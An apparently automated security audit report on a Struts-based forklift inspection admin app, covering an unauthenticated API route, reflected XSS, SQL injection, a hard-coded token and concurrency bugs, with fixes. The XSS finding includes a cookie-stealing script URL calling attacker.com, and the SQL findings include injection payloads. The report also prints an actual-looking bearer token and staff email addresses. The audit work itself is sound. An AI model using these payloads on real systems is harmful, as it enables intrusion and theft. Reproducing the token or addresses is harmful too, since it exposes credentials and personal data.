# Security Audit Report — Pass 1
**Date:** 2026-02-26
**Auditor:** Automated Pass 1
**Application:** forkliftiqadmin (Apache Struts 1.3.10 / Tomcat)
**Branch:** master

**Files audited:**
- `src/main/java/com/action/AppAPIAction.java`
- `src/main/java/com/report/ReportAPI.java`
- `src/main/java/com/service/ReportService.java`
- `src/main/java/com/service/ReportServiceException.java`
- `src/main/java/com/bean/ReportFilterBean.java`
- `src/main/java/com/actionform/ReportSearchForm.java`
- `src/main/webapp/html-jsp/registerSuccess.jsp`
- `src/main/webapp/html-jsp/resetpass.jsp`

**Supporting files examined:**
- `src/main/java/com/actionservlet/PreFlightActionServlet.java`
- `src/main/webapp/WEB-INF/struts-config.xml`
- `src/main/webapp/html-jsp/apiXml.jsp`
- `src/main/java/com/util/RuntimeConf.java`
- `src/main/java/com/util/HttpDownloadUtility.java`
- `src/main/java/com/dao/ResultDAO.java`
- `src/main/java/com/dao/IncidentReportDAO.java`
- `src/main/java/com/dao/ImpactReportDAO.java`
- `src/main/java/com/dao/SessionDAO.java`
- `src/main/java/com/querybuilder/**` (all query builder classes)

---

## Executive Summary

The most severe issue in this pass is the **AppAPIAction dead-code threat surface**: the entire mobile API is commented out but the Struts action and its unauthenticated route (`api.do`) remain live and mapped in `struts-config.xml`. If the comment block is ever accidentally or deliberately uncommented — by a developer, a merge conflict resolution, or a malicious insider — the application would immediately expose unauthenticated read and write access across all tenant data with no authentication check. This is a latent critical vulnerability.

Separately, `resetpass.jsp` contains a **confirmed reflected XSS** vulnerability: the `username` request parameter is written directly into an HTML attribute with no escaping. `ResultDAO.java` contains **confirmed SQL injection** in multiple methods that are in active use by other parts of the application. `HttpDownloadUtility` hard-codes a **bearer token credential** in source code. `ReportService` has a **broken double-checked locking singleton** (race condition).

---

## Findings

---

### CRITICAL: `api.do` is unauthenticated and the full mobile API is one uncomment away from live exposure

**File:** `src/main/java/com/action/AppAPIAction.java` (lines 45–373) and `src/main/webapp/WEB-INF/struts-config.xml` (lines 446–451) and `src/main/java/com/actionservlet/PreFlightActionServlet.java` (line 106)

**Description:**

`api.do` maps to `AppAPIAction` and is explicitly excluded from the authentication gate in `PreFlightActionServlet.excludeFromFilter()`:

```java
// PreFlightActionServlet.java line 106
else if (path.endsWith("api.do")) return false;
```

The `excludeFromFilter` method returns `false` to bypass the auth check. `api.do` is therefore reachable by **any anonymous Internet user** with no session required.

The Struts config confirms the mapping:

```xml
<!-- struts-config.xml lines 446-451 -->
<action
    path="/api"
    scope="request"
    type="com.action.AppAPIAction">
    <forward name="apiXml" path="/html-jsp/apiXml.jsp"/>
</action>
```

The entire body of `AppAPIAction.execute()` is commented out using `////` (four-slash comments), leaving only:

```java
// AppAPIAction.java lines 371-372
request.setAttribute("method", action);  // also commented out
return mapping.findForward("apiXml");
```

In the current state `action` is `null` (the `request.setAttribute("method", action)` call on line 371 is actually also commented out — note the `//` prefix), so `request.getAttribute("method")` in `apiXml.jsp` returns `null`, and line 13 of `apiXml.jsp` calls `method.equalsIgnoreCase(...)` on a null reference, immediately throwing a `NullPointerException`. The endpoint is therefore broken at the JSP level today.

**However**, the commented-out code block implements a complete unauthenticated mobile API supporting six operations:

| Action value (`action` param) | Operation |
|---|---|
| `checklogin` | Credential-based login returning a company API key (`compKey`) |
| `getDriverlst` | Enumerate ALL drivers for a company |
| `getVehlst` | Enumerate ALL vehicles (units) for a company |
| `getAttlst` | Enumerate ALL attachments for a company |
| `getQueslst` | Retrieve all inspection questions for a vehicle |
| `saveResult` | Submit forklift inspection results to the database, trigger email alerts |
| `pdfrpt` | Generate a PDF report and email it |

There is no independent authentication check in `AppAPIAction.execute()`. The design intent was that the `action=checklogin` call returns a `compKey` token which is then used as the sole authorization mechanism for all subsequent calls (validated via `companyDao.getCompIdByKey(compKey)`). There is no session, no CSRF token, no rate limiting, and no IP restriction visible in the code.

**The risk of this finding is rated CRITICAL for two reasons:**

1. The uncomment barrier is trivially low — a single search-and-replace removing the `////` prefix, a bad merge, or a developer "restoring" the code restores full exposure instantly.
2. The underlying Struts action, its route (`api.do`), and its view (`apiXml.jsp`) are all fully operational infrastructure. The application is already accepting unauthenticated requests to this endpoint; they simply crash at the JSP layer today.

**Risk:** If the comment block is removed (deliberately or accidentally): unauthenticated users can enumerate all drivers and vehicles across every tenant, submit fraudulent inspection results, trigger email alerts to arbitrary addresses, and request PDF reports — all without a valid session. The `saveResult` path writes directly to the `result` and `answer` tables. The `pdfrpt` path invokes `FleetCheckPDF` and sends emails. There is no company isolation check other than validating `compKey` against the database.

**Recommendation:**
1. Remove the dead route entirely from `struts-config.xml` if the mobile API is not in use, or move it to a separate, clearly maintained branch.
2. If the API is to be reactivated, implement a proper API token mechanism with per-request HMAC signing or a short-lived JWT, not a long-lived static `compKey`.
3. Add the `api.do` route to a regression test that asserts a 401/403 response to unauthenticated requests, so any accidental uncomment is caught in CI.
4. Delete the `apiXml.jsp` view or gate it so it cannot render sensitive data without a valid session attribute.

---

### CRITICAL: Reflected XSS via unescaped `username` parameter in `resetpass.jsp`

**File:** `src/main/webapp/html-jsp/resetpass.jsp` (line 2 and line 32)

**Description:**

The JSP uses a raw scriptlet to read the `username` request parameter and then emits it directly into an HTML attribute value with no escaping:

```jsp
<!-- line 2 -->
<% String username = request.getParameter("username") == null ? "" : request.getParameter("username"); %>

<!-- line 32 -->
<input type="hidden" name="username" value="<%=username%>">
```

An attacker can craft a URL such as:

```
https://target/resetpass.do?username="><script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

When a victim loads this URL (e.g., via a phishing email that appears to be a legitimate "reset your password" link), the injected script executes in the victim's browser in the context of the application origin. This page is on the auth-excluded list (`goResetPass.do` and `resetpass.do` both bypass the auth gate — see `PreFlightActionServlet` lines 110-111), meaning the attack works against unauthenticated users and does not require any existing session.

The `resetpass.do` endpoint is publicly accessible:
```java
// PreFlightActionServlet.java lines 110-111
else if(path.endsWith("resetpass.do")) return false;
else if(path.endsWith("goResetPass.do")) return false;
```

**Risk:** Session cookie theft (if `HttpOnly` is not set), credential harvesting via form replacement, phishing attacks that exploit the trusted application domain, delivery of malware payloads. The `resetpass.do` page is specifically targeted at users who have forgotten their credentials, making them a higher-value target for social engineering.

**Recommendation:**
Replace the raw scriptlet with JSTL `<c:out>` or explicit HTML encoding. Replace lines 2 and 32 as follows:

```jsp
<!-- Replace line 2: pass username through the action layer, not via raw request param -->
<!-- In the JSP, use: -->
<c:out value="${param.username}" />
```

Or at minimum:

```java
String username = Util.htmlEncode(request.getParameter("username") == null ? "" : request.getParameter("username"));
```

where `htmlEncode` escapes `<`, `>`, `"`, `'`, and `&`. The preferred fix is to pass the username through the Struts action as a request attribute rather than re-reading it from `request.getParameter` in the JSP.

---

### HIGH: SQL injection in `ResultDAO.getChecklistResultInc()` — active production code

**File:** `src/main/java/com/dao/ResultDAO.java` (line 145)

**Description:**

The method `getChecklistResultInc` builds a SQL query using string concatenation of caller-supplied `driverId` and `sDate`/`eDate` values:

```java
// ResultDAO.java line 145
String sql = "select id,driver_id,comment,to_char(timestamp,'dd/mm/yyyy HH24:MI:SS'),unit_id from result where driver_id = "
    + driverId
    + " and timestamp >= '"
    + sDate
    + "'::timestamp and timestamp <= '"
    + eDate
    + "'::timestamp order by timestamp";
```

`driverId` is a `Long` type (coerced by the compiler but originally derived from user input upstream), so numeric injection is less likely for that parameter. However, `sDate` and `eDate` are `java.util.Date` objects whose `.toString()` output is directly concatenated into the SQL string. The format of `Date.toString()` (e.g., `"Thu Jan 01 00:00:00 UTC 2015"`) is locale- and JVM-implementation-dependent, and PostgreSQL will reject it with a cast error. More critically: if the caller passes a crafted `Date` object or a date parsed from user-supplied input without strict validation, the string representation could contain SQL metacharacters. The root issue is that no prepared statement parameter binding is used for the timestamp values.

```java
// Contrast with the safe pattern used elsewhere in the same codebase:
ps.setTimestamp(5, resultBean.getTimestamp()); // ResultDAO.saveResult(), line 49 — correct
```

This method is called by at least one active action class (visible in the codebase search), meaning this is production-path code, not dead code.

**Risk:** An attacker with access to the authenticated UI (or if this is reachable indirectly via the API) could inject arbitrary SQL, potentially reading all tables, extracting passwords/hashes, or modifying records.

**Recommendation:** Replace the string concatenation with a `PreparedStatement`:

```java
String sql = "select id,driver_id,comment,to_char(timestamp,'dd/mm/yyyy HH24:MI:SS'),unit_id "
           + "from result where driver_id = ? and timestamp >= ? and timestamp <= ? order by timestamp";
ps = conn.prepareStatement(sql);
ps.setLong(1, driverId);
ps.setTimestamp(2, new Timestamp(sDate.getTime()));
ps.setTimestamp(3, new Timestamp(eDate.getTime()));
```

---

### HIGH: SQL injection in `ResultDAO.checkDuplicateResult()` — active production code

**File:** `src/main/java/com/dao/ResultDAO.java` (lines 294-295)

**Description:**

`checkDuplicateResult` concatenates `driverId`, `unitId`, and `time` directly into a SQL string using a `Statement` (not a `PreparedStatement`):

```java
// ResultDAO.java lines 294-295
String sql = "select count(id) from result "
           + " where driver_id= " + driverId
           + " and unit_id= " + unitId
           + " and timestamp = '" + time + "'";
```

`driverId` and `unitId` are `String` parameters. The method signature accepts them as raw `String`, meaning they may contain arbitrary text. Although the immediate callers in the codebase appear to pass numeric strings, there is no numeric validation inside this method. `time` is a `java.sql.Timestamp` and its `.toString()` value is concatenated directly into the SQL.

An authenticated user who can manipulate the `driverId` or `unitId` fields (e.g., via a form submission) can inject SQL. Example malicious `driverId`: `1 OR 1=1 --`

**Risk:** Data exfiltration or manipulation by an authenticated user. In a multi-tenant system this is especially dangerous because a tenant user could potentially escape the company scoping filter.

**Recommendation:** Convert to a `PreparedStatement`:

```java
String sql = "select count(id) from result where driver_id = ? and unit_id = ? and timestamp = ?";
ps = conn.prepareStatement(sql);
ps.setString(1, driverId);
ps.setString(2, unitId);
ps.setTimestamp(3, time);
```

---

### HIGH: SQL injection in `ResultDAO.saveResult()` — active production code, multiple locations

**File:** `src/main/java/com/dao/ResultDAO.java` (lines 61, 65, 74, 85, 91, 113)

**Description:**

Although the primary `INSERT` into the `result` table uses a `PreparedStatement` correctly (lines 42-53), the cleanup and answer-insertion logic within `saveResult` falls back to raw string concatenation in several critical paths:

**Pattern 1 — Cleanup DELETE via raw Statement (lines 61, 85, 113):**
```java
// line 61
sql = "delete from result where id = " + result_id;
stmt.execute(sql);
// line 85
sql = "delete from result where id = " + result_id;
stmt.execute(sql);
// line 113 (in catch block)
sql = "delete from result where id = " + result_id;
Objects.requireNonNull(stmt).execute(sql);
```
`result_id` is an `int` obtained from a database sequence, so direct injection here is low risk, but the pattern is dangerous and wrong.

**Pattern 2 — Answer content concatenated into INSERT (line 74):**
```java
// line 74
sql = "insert into answer (answer,result_id,question_id,question_text,expectedanswer,answer_type,faulty) "
    + "select ?,?,?,'" + content + "',expectedanswer,answer_type,? from question where id = ?";
```
Here `content` is a string retrieved from the database (`question_content` table), so it is not directly user-supplied. However, if `content` contains a single-quote character (e.g., from a question text like "What's the fuel level?"), it will break the SQL syntax. More importantly, if the `question_content` table has been compromised or populated via an injection pathway elsewhere, this becomes a second-order SQL injection.

**Pattern 3 — Raw string concatenation for `question_content` lookup (line 65):**
```java
// line 65
sql = "select content from question_content where lan_id = " + lanId + " and question_id = " + answer.getQuesion_id();
```
`answer.getQuesion_id()` is a String from user input (submitted answer bean). Although there is a downstream check `answer.getQuesion_id().equalsIgnoreCase("")` (line 60), there is **no validation that the value is numeric**. An attacker submitting a `quesion_id` value of `1 UNION SELECT password FROM login--` would inject into this query.

**Pattern 4 — `answer_type` lookup (line 91):**
```java
// line 91
sql = "select answer_type.name from question,answer_type where question.id ="
    + answer.getQuesion_id()
    + " and question.answer_type = answer_type.id";
```
Same injection vector as Pattern 3: `answer.getQuesion_id()` is user-supplied and unvalidated.

**Risk:** Pattern 3 and Pattern 4 allow an authenticated attacker submitting forklift inspection results to inject arbitrary SQL into the question lookup queries. In the worst case this allows full database read access (UNION-based injection) or blind injection. Since `saveResult` writes data to the database, the attacker controls the full write path as well.

**Recommendation:** All four patterns must be converted to `PreparedStatement` bindings. The `content` concatenation (Pattern 2) must use a `?` placeholder. The `quesion_id` field must be validated as numeric before use (e.g., `answer.getQuesion_id().matches("[0-9]+")`).

---

### HIGH: Hard-coded API bearer token credential in source code

**File:** `src/main/java/com/util/HttpDownloadUtility.java` (line 105)

**Description:**

A bearer token is hard-coded as a string literal in the source file:

```java
// HttpDownloadUtility.java line 105
con.setRequestProperty("X-AUTH-TOKEN", "noCwHkr7lofpFL0ZAL2EzynUBLKN1Krcs8bSunismUE");
```

This token is used to authenticate outbound PDF export requests to an AWS EC2 endpoint (`http://ec2-52-5-205-104.compute-1.amazonaws.com/api/export/pdf/` — see `RuntimeConf.java` line 60, also hard-coded). The token is committed to version control and visible to anyone with repository access. Because git history is permanent, even rotating the token does not fully remediate the exposure in the git history without a history rewrite.

Additionally, the target URL uses plain HTTP (not HTTPS — the HTTPS connection line is commented out on line 98-99):

```java
// Line 97-99
//  Secure connection
//  HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
HttpURLConnection con = (HttpURLConnection)obj.openConnection();
```

This means the bearer token and the PDF content are transmitted in cleartext over the network.

**Risk:** Anyone with access to the repository (including external contributors, auditors, or attackers who obtain the source) can authenticate to the PDF export API as the application. The unencrypted transport exposes the token to network-level eavesdroppers.

**Recommendation:**
1. Immediately rotate the `X-AUTH-TOKEN` value.
2. Move the token to an environment variable or a secure configuration store (e.g., Vault, AWS Secrets Manager) and load it at runtime. Remove it from `RuntimeConf.java` and from source code entirely.
3. Re-enable the `HttpsURLConnection` path and remove the plain HTTP fallback.
4. Rewrite git history to remove the token if the repository is shared externally (`git filter-branch` or `git-filter-repo`).

---

### HIGH: `HttpDownloadUtility.saveFilePath` is a static mutable field — race condition / path disclosure under concurrency

**File:** `src/main/java/com/util/HttpDownloadUtility.java` (lines 26, 160, 186-192)

**Description:**

`saveFilePath` is a `private static String` field on the class:

```java
// line 26
private static String saveFilePath = "";

// line 160 (written inside sendPost)
saveFilePath = saveDir + fileName + RuntimeConf.file_type;

// lines 186-188 (public getter)
public static String getSaveFilePath() {
    return saveFilePath;
}
```

In a multi-threaded Tomcat environment, if two requests invoke `sendPost` concurrently (e.g., two admin users generating PDF reports simultaneously), `saveFilePath` will be overwritten by the second thread before the first thread reads it. The first thread's `ReportAPI.downloadPDF()` call will then return the **wrong file path**, potentially causing User A to receive User B's PDF report — a cross-tenant data leak.

**Risk:** Cross-tenant / cross-user PDF file disclosure under concurrent load. One tenant receives another tenant's report document.

**Recommendation:** Remove the static state. Convert `saveFilePath` to an instance variable or return it as the method's return value rather than storing it in a static field. For example:

```java
public static String sendPost(String fileName, String input, String saveDir) throws Exception {
    // ...
    String localSaveFilePath = saveDir + fileName + RuntimeConf.file_type;
    // write to localSaveFilePath
    return localSaveFilePath;  // return instead of storing in static field
}
```

---

### MEDIUM: Broken double-checked locking singleton in `ReportService` — possible null return under race condition

**File:** `src/main/java/com/service/ReportService.java` (lines 18-27)

**Description:**

`ReportService.getInstance()` uses a double-checked locking pattern, but the `theInstance` field is not declared `volatile`:

```java
// ReportService.java lines 18-27
private static ReportService theInstance;  // NOT volatile

public static ReportService getInstance() {
    if (theInstance == null) {               // first check — not synchronized
        synchronized (ReportService.class) {
            theInstance = new ReportService();  // missing second null check inside sync block
        }
    }
    return theInstance;
}
```

There are two defects:
1. `theInstance` is not `volatile`, so the JVM is not required to flush the write to main memory before releasing the `synchronized` block. A second thread performing the outer `if (theInstance == null)` check may see a partially-constructed object.
2. There is no second null check *inside* the `synchronized` block. If two threads both pass the outer null check simultaneously, both will enter the synchronized block in sequence and each will construct and assign a new `ReportService`, discarding the first instance.

Note for comparison: `ImpactReportDAO` (line 17-25) implements the pattern correctly with a double null check inside the synchronized block, though it also lacks `volatile`.

**Risk:** In the worst case (partially-constructed object returned), a thread could call methods on an uninitialized `ReportService` instance, causing `NullPointerException` or returning incorrect data. More commonly, two instances would be constructed and one silently discarded, which is a functional defect rather than a security issue, but the pattern is wrong and may mask more serious state corruption.

**Recommendation:** Declare `theInstance` as `volatile` and add the inner null check:

```java
private static volatile ReportService theInstance;

public static ReportService getInstance() {
    if (theInstance == null) {
        synchronized (ReportService.class) {
            if (theInstance == null) {           // second check inside sync block
                theInstance = new ReportService();
            }
        }
    }
    return theInstance;
}
```

Or preferably use the initialization-on-demand holder idiom, which is simpler and guaranteed correct by the JLS.

---

### MEDIUM: `apiXml.jsp` throws `NullPointerException` on every request to `api.do` — potential information disclosure via error page

**File:** `src/main/webapp/html-jsp/apiXml.jsp` (line 13)

**Description:**

When `api.do` is requested, `AppAPIAction.execute()` does not set the `"method"` request attribute (the `request.setAttribute("method", action)` call on line 371 of `AppAPIAction.java` is commented out). The JSP then does:

```jsp
// apiXml.jsp line 11-13
String method = (String)request.getAttribute("method");
// ...
if(method.equalsIgnoreCase(RuntimeConf.API_LOGIN))  // NullPointerException: method is null
```

This results in an unhandled `NullPointerException` on every invocation. Depending on Tomcat's `showServerInfo` and error page configuration, the stack trace may be returned to the caller, disclosing:
- Internal package names (`com.action.AppAPIAction`, JSP file paths)
- Tomcat version (in default error pages)
- The application's internal URL structure

Even without stack trace disclosure, an unauthenticated attacker probing `api.do` receives a 500 response confirming the endpoint exists and is misconfigured.

**Risk:** Information disclosure; endpoint enumeration confirmation; potential for stack trace exposure depending on server error page configuration.

**Recommendation:**
1. Add a null guard at the top of `apiXml.jsp`: `if (method == null) { response.sendError(404); return; }`
2. Configure a custom error page for HTTP 500 in `web.xml` that does not expose stack traces.
3. The root fix is to remove the `api.do` mapping entirely (see the CRITICAL finding above).

---

### MEDIUM: Hard-coded internal email addresses and external URLs in `RuntimeConf.java`

**File:** `src/main/java/com/util/RuntimeConf.java` (lines 16, 58, 60)

**Description:**

Three sensitive values are hard-coded as `public static` (mutable, globally accessible) string fields:

```java
// RuntimeConf.java
public static String RECEIVER_EMAIL = "hui@ciifm.com"; //live        // line 16
public static String debugEmailRecipet = "hui@collectiveintelligence.com.au";  // line 58
public static String APIURL = "http://ec2-52-5-205-104.compute-1.amazonaws.com/api/export/pdf/"; // line 60
```

Issues:
1. **Personal email addresses in source code**: `hui@ciifm.com` and `hui@collectiveintelligence.com.au` appear to be individual staff email addresses hard-coded as the recipient for system alerts and debug emails. If the individual leaves the organization, these will continue to receive notifications. These are also exposed to anyone with repository access.
2. **Plain-HTTP AWS EC2 endpoint**: The `APIURL` points to a raw EC2 IP address over plain HTTP with no TLS. The instance is publicly addressable by its IP, which may change if the instance is recycled.
3. **`public static` (mutable) fields**: Because these fields are not `final`, any code in the application (including a compromised module) can reassign them at runtime (e.g., `RuntimeConf.RECEIVER_EMAIL = "attacker@evil.com"`). All subsequent alert emails would then go to the attacker.

**Risk:** Email redirect attack if a class can modify the static field; continued delivery of security alerts to a departed employee; APIURL is a single point of failure with no TLS.

**Recommendation:**
1. Declare all `RuntimeConf` fields as `static final` and load environment-specific values from a properties file or environment variables at application startup.
2. Move email addresses to configuration, not source code.
3. Replace the raw EC2 HTTP URL with a stable HTTPS hostname behind a proper DNS entry.

---

### MEDIUM: `ReportServiceException` extends `RuntimeException` — unchecked exception silently swallowed

**File:** `src/main/java/com/service/ReportServiceException.java` (line 3) and `src/main/java/com/service/ReportService.java` (line 97)

**Description:**

`ReportServiceException` is an unchecked (`RuntimeException`) exception:

```java
// ReportServiceException.java line 3
public class ReportServiceException extends RuntimeException {
```

In `ReportService.getSessionReport()`, the exception is thrown from a `catch` block but the method signature does not declare it:

```java
// ReportService.java lines 90-99
public SessionReportBean getSessionReport(int compId, ...) {  // no throws declaration
    try {
        return SessionDAO.getSessions(compId, filter, dateFormat, timezone);
    } catch (SQLException e) {
        throw new ReportServiceException("Unable to get impact report for compId : " + compId, e);
    }
}
```

The error message on line 97 also incorrectly refers to "impact report" when this is the session report method, indicating copy-paste without review. More critically: because `ReportServiceException` is unchecked, callers do not need to (and in practice do not) catch it. If the database is unavailable or a query fails, the exception propagates as an unhandled runtime exception to Tomcat's default error handler, which may expose a full stack trace (including the SQL query, table names, and `compId` value) in the HTTP response.

**Risk:** Information disclosure through unhandled exception stack traces; incorrect error message may mislead operators debugging production incidents.

**Recommendation:**
1. Catch `ReportServiceException` in the Struts action layer and forward to a generic error page rather than letting it propagate to Tomcat.
2. Configure a global Struts exception handler in `struts-config.xml` for `ReportServiceException`.
3. Fix the copy-paste error in the error message on line 97.

---

### LOW: `apiXml.jsp` XML output is not properly escaped — potential XML injection / XSS in XML content type

**File:** `src/main/webapp/html-jsp/apiXml.jsp` (lines 16, 24, 33, 42)

**Description:**

The XML response is built by direct string concatenation of database values with no XML escaping applied to most fields:

```jsp
// line 16 — compKey value unescaped
resp=resp+"<rec><compKey>"+compKey+"</compKey></rec>";

// line 24 — unit name unescaped
resp=resp+"<rec><id>"+unitBean.getId()+"</id><name>"+ unitBean.getName()+"</name></rec>";

// line 33 — driver first/last name unescaped
resp=resp+"<rec><id>"+driverBean.getId()+"</id><name>"+ driverBean.getFirst_name()+" "+ driverBean.getLast_name()+"</name></rec>";

// line 42 — attachment name unescaped
resp=resp+"<rec><id>"+attachmentBean.getId()+"</id><name>"+ attachmentBean.getName()+"</name></rec>";
```

The `API_QUESTION` block (lines 46-74) attempts escaping but does so incorrectly: the `else if` chain means only the **first** special character type found is escaped, not all of them. For example, a string containing both `&` and `<` would only have the `&` escaped:

```jsp
// lines 53-71 — broken escaping: only handles first matched character type
if(content.contains("&")) {
    content = content.replace("&","&amp;");
} else if(content.contains("'")) {
    content = content.replace("'","&apos;");
} else if(content.contains("\"")) { ... }
// A string with both & and < gets only & replaced; < remains raw XML
```

If a driver name, vehicle name, or question content stored in the database contains `<`, `>`, or `&` characters (which are entirely plausible in free-text fields), the generated XML is malformed and may be exploitable as XML injection or result in XSS if a client renders the XML as HTML.

**Risk:** Malformed XML responses cause client parsing errors; if a web client renders the XML response, stored data containing script tags could result in stored XSS. The incorrect escaping logic means some data is partially escaped and some is not, creating unpredictable behavior.

**Recommendation:**
1. Use a proper XML library (e.g., `javax.xml.stream.XMLStreamWriter` or JAXB) to construct the response rather than string concatenation.
2. Replace the `else if` escaping chain with a proper `String.replace` applied in order (first `&`, then `<`, then `>`, then `"`, then `'`) or use Apache Commons `StringEscapeUtils.escapeXml11()`.

---

### LOW: `registerSuccess.jsp` — no active XSS but contains unused form posting to `login.do`

**File:** `src/main/webapp/html-jsp/registerSuccess.jsp` (line 32)

**Description:**

```jsp
// registerSuccess.jsp line 32
<html:form method="post" action="login.do" styleClass="login-fields">
```

This page is the post-registration success screen. It renders a Struts `html:form` tag targeting `login.do` with `method="post"`. The form contains no `<html:hidden>` fields with user-supplied values, and the only dynamic content rendered is via `<bean:message>` (which reads from a message bundle, not from user input) and `<html:errors>` (which renders Struts ActionErrors stored in the session — not directly from request parameters). No reflected XSS vectors were identified in this file.

However, the `<html:form>` wrapper is present even though there are no actual form inputs rendered. The page auto-redirects to `index.jsp` after 10 seconds via a JavaScript countdown. The presence of a form posting to `login.do` within a success page is unusual and may confuse future developers about the intended data flow, potentially leading to accidental form field additions that could introduce XSS in future modifications.

The JavaScript redirect uses `location.replace(url)` where `url = "index.jsp"` is a hard-coded string literal — no injection risk.

**Risk:** Low — no active vulnerability. Future maintenance risk.

**Recommendation:** Remove the `<html:form>` wrapper since this page does not submit any data. Keep only the display content and the redirect script.

---

### INFO: `ReportAPI` is a utility class, not an HTTP endpoint — no direct auth concern

**File:** `src/main/java/com/report/ReportAPI.java` (all lines)

**Description:**

`ReportAPI` is a plain Java class (not a Struts `Action`, not a servlet, not a REST endpoint). It is not mapped to any URL. Its role is to encapsulate the logic for downloading a PDF from an external API via `HttpDownloadUtility.sendPost()` and returning the local file path for subsequent email attachment. It is instantiated by server-side action classes that are themselves behind the authentication gate.

The `getExportDir()` method returns `System.getProperty("java.io.tmpdir")`, which is the OS temporary directory — this is appropriate for temporary PDF storage.

There is no authentication concern specific to this class in isolation. The security issues associated with its dependencies (`HttpDownloadUtility`'s hard-coded token, unencrypted transport, and static race condition) are documented in separate findings above.

**Risk:** None for this class directly.

**Recommendation:** No action required on this class beyond the `HttpDownloadUtility` remediations documented above.

---

### INFO: `ReportFilterBean` and `ReportSearchForm` — no direct security issues

**File:** `src/main/java/com/bean/ReportFilterBean.java` and `src/main/java/com/actionform/ReportSearchForm.java` (all lines)

**Description:**

`ReportFilterBean` is a data transfer object annotated with Lombok `@Data` and `@AllArgsConstructor`. It holds filter criteria (date range, manufacturer ID, unit type ID, timezone). Fields are typed as `Date`, `Long`, and `String`. The `timezone` field is a `String` that is passed to `DateBetweenFilterHandler` and ultimately bound as a `PreparedStatement` parameter (via `preparer.addString(filter.timezone())`), so it is not vulnerable to SQL injection.

`ReportSearchForm` is a Struts `ActionForm` holding form input strings (`start_date`, `end_date`, `timezone`) and dropdown selections (`manu_id`, `type_id`). Date strings are converted to `Date` objects by the action layer before being placed into `ReportFilterBean`. No direct rendering of these form fields back to HTML in audited files was observed, so XSS risk was not identified in this pass.

`timezone` is accepted as a free-form `String` from the user and passed into SQL as a bind parameter. PostgreSQL's `timezone()` function will throw an error for an invalid timezone name, but will not execute arbitrary SQL since it is bound via `PreparedStatement`. An invalid timezone would result in a `ReportServiceException` and a 500 error.

**Risk:** Low — the timezone value could be used to cause deliberate errors (denial of service for a single report request) but not SQL injection.

**Recommendation:** Validate `timezone` against a whitelist of known timezone identifiers (e.g., `java.util.TimeZone.getAvailableIDs()`) before using it, to prevent error-based probing and provide better user feedback.

---

## Summary Table

| # | Severity | Title | File |
|---|---|---|---|
| 1 | CRITICAL | `api.do` unauthenticated, full mobile API one uncomment from live | `AppAPIAction.java`, `struts-config.xml`, `PreFlightActionServlet.java` |
| 2 | CRITICAL | Reflected XSS via unescaped `username` in `resetpass.jsp` | `resetpass.jsp` line 32 |
| 3 | HIGH | SQL injection in `ResultDAO.getChecklistResultInc()` | `ResultDAO.java` line 145 |
| 4 | HIGH | SQL injection in `ResultDAO.checkDuplicateResult()` | `ResultDAO.java` lines 294-295 |
| 5 | HIGH | SQL injection in `ResultDAO.saveResult()` — multiple locations | `ResultDAO.java` lines 65, 74, 91 |
| 6 | HIGH | Hard-coded API bearer token in source code | `HttpDownloadUtility.java` line 105 |
| 7 | HIGH | Static mutable `saveFilePath` — race condition / cross-tenant file disclosure | `HttpDownloadUtility.java` line 26 |
| 8 | MEDIUM | Broken double-checked locking singleton in `ReportService` | `ReportService.java` lines 18-27 |
| 9 | MEDIUM | `apiXml.jsp` NPE on every `api.do` request — potential stack trace exposure | `apiXml.jsp` line 13 |
| 10 | MEDIUM | Hard-coded email addresses and plain-HTTP AWS URL in `RuntimeConf` | `RuntimeConf.java` lines 16, 58, 60 |
| 11 | MEDIUM | `ReportServiceException` unchecked, silently propagates to Tomcat error handler | `ReportService.java` line 97, `ReportServiceException.java` |
| 12 | LOW | Incomplete XML escaping in `apiXml.jsp` — potential XML injection | `apiXml.jsp` lines 53-71 |
| 13 | LOW | Unused `<html:form>` in `registerSuccess.jsp` — maintenance risk | `registerSuccess.jsp` line 32 |
| 14 | INFO | `ReportAPI` is not an HTTP endpoint — no direct auth concern | `ReportAPI.java` |
| 15 | INFO | `ReportFilterBean`/`ReportSearchForm` — no direct vulnerabilities; timezone validation suggested | `ReportFilterBean.java`, `ReportSearchForm.java` |

---

**CRITICAL: 2 / HIGH: 5 / MEDIUM: 4 / LOW: 2 / INFO: 2**
